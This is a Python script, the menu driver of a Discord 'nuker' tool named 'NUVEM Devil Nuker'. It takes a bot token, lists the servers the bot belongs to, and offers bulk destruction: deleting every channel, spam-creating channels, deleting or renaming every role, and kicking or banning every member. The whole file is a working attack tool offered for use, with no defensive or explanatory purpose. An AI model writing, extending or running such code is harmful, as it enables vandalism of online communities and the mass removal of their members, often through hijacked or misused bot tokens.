import sys
import time
import requests
from nuker import Nuker
from utils import clear, rocket_animation, rgb_print, print_rgb_header

def fetch_guilds(token):
    url = "https://discord.com/api/v10/users/@me/guilds"
    headers = {"Authorization": f"Bot {token}"}
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return r.json()
    return []

def main():
    clear()
    print_rgb_header("=== NUVEM Devil Nuker ===\n")

    token = input("Enter your bot token: ").strip()

    print("\nFetching your guilds...")
    guilds = fetch_guilds(token)
    if not guilds:
        print("No guilds found or invalid token.")
        sys.exit()

    print("\nSelect a guild:")
    for idx, g in enumerate(guilds):
        print(f"{idx+1}. {g['name']}")

    while True:
        try:
            choice = int(input("\nGuild number: "))
            if 1 <= choice <= len(guilds):
                break
            print("Invalid choice.")
        except ValueError:
            print("Enter a valid number.")

    guild = guilds[choice - 1]
    nuker = Nuker(token, guild['id'])

    while True:
        clear()
        print_rgb_header(f"NUVEM Devil Nuker - {guild['name']}\n")
        print("1. Delete All Channels")
        print("2. Spam Channels (custom name)")
        print("3. Delete All Roles")
        print("4. Rename All Roles (custom name)")
        print("5. Kick All Members")
        print("6. Ban All Members")
        print("7. Exit")

        action = input("\nChoose action: ").strip()

        if action == '1':
            clear()
            print("Deleting all channels...")
            rocket_animation()
            channels = nuker.get_channels()
            for ch in channels:
                nuker.delete_channel(ch['id'])
                time.sleep(0.05)
            input("Channels deleted. Press Enter to continue.")

        elif action == '2':
            name = input("Enter channel name to spam: ").strip()
            amount = input("Number of channels to create: ").strip()
            if not amount.isdigit():
                input("Invalid number. Press Enter.")
                continue
            amount = int(amount)
            clear()
            print(f"Creating {amount} channels named '{name}'...")
            rocket_animation()
            for _ in range(amount):
                nuker.create_channel(name)
                time.sleep(0.05)
            input("Channels created. Press Enter to continue.")

        elif action == '3':
            clear()
            print("Deleting all roles...")
            rocket_animation()
            roles = nuker.get_roles()
            # skip @everyone role (usually id = guild id)
            for role in roles:
                if role['name'] != "@everyone":
                    nuker.delete_role(role['id'])
                    time.sleep(0.05)
            input("Roles deleted. Press Enter to continue.")

        elif action == '4':
            new_name = input("Enter new role name to rename all roles: ").strip()
            clear()
            print(f"Renaming all roles to '{new_name}'...")
            rocket_animation()
            roles = nuker.get_roles()
            for role in roles:
                if role['name'] != "@everyone":
                    nuker.rename_role(role['id'], new_name)
                    time.sleep(0.05)
            input("Roles renamed. Press Enter to continue.")

        elif action == '5':
            clear()
            print("Kicking all members...")
            rocket_animation()
            members = nuker.get_members()
            for member in members:
                nuker.kick_member(member['user']['id'])
                time.sleep(0.05)
            input("Members kicked. Press Enter to continue.")

        elif action == '6':
            clear()
            print("Banning all members...")
            rocket_animation()
            members = nuker.get_members()
            for member in members:
                nuker.ban_member(member['user']['id'])
                time.sleep(0.05)
            input("Members banned. Press Enter to continue.")

        elif action == '7':
            print("Exiting...")
            break

        else:
            print("Invalid choice.")
            time.sleep(1)


if __name__ == "__main__":
    main()